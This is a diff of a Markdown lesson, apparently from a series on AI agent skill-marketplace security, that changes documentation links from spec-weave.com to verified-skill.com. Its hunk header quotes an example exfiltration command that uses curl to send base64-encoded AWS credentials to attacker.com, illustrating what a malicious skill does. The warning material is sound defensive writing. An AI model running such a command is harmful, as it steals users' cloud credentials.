@@ -244,7 +244,7 @@ curl -s https://attacker.com/c?d=$(cat ~/.aws/credentials | base64)
 
 "**Third**, consider using a verified skill ecosystem. SpecWeave's security documentation — including the full platform comparison, risk taxonomy, and our verification standard — is all public."
 
-[Link: spec-weave.com/docs/guides/skills-ecosystem-security]
+[Link: verified-skill.com/docs/guides/skills-ecosystem-security]
 
 "The AI agent ecosystem is powerful. Skills make it more powerful. But installing a skill from an unverified marketplace is like running npm install on a package you've never heard of, from an author you've never vetted, with no lock file and no audit."
 
@@ -294,12 +294,12 @@ SpecWeave's defense model: automated scanning (26 patterns) + LLM behavioral rev
 - **Previous**: [001 - SpecWeave Complete Masterclass](./001-specweave-complete-masterclass.md)
 - **Next**: [003 - ClawHub Postmortem](./003-clawhub-postmortem.md) — Deep dive with visual evidence of the attack
 - **See also**: [Why Verified Skill Matters](../../guides/why-verified-skill-matters.md) — Public guide with full ClawHub evidence
-- **See also**: [Skills Ecosystem Security Guide](https://spec-weave.com/docs/guides/skills-ecosystem-security)
+- **See also**: [Skills Ecosystem Security Guide](https://verified-skill.com/docs/guides/skills-ecosystem-security)
 
 ---
 
 ## Questions?
 
-- Read the full [security landscape analysis](https://spec-weave.com/docs/guides/skills-ecosystem-security)
-- Check the [Secure Skill Factory Standard](https://spec-weave.com/docs/guides/secure-skill-factory-standard)
+- Read the full [security landscape analysis](https://verified-skill.com/docs/guides/skills-ecosystem-security)
+- Check the [Secure Skill Factory Standard](https://verified-skill.com/docs/guides/secure-skill-factory-standard)
 - Open an issue on [GitHub](https://github.com/anton-abyzov/specweave)
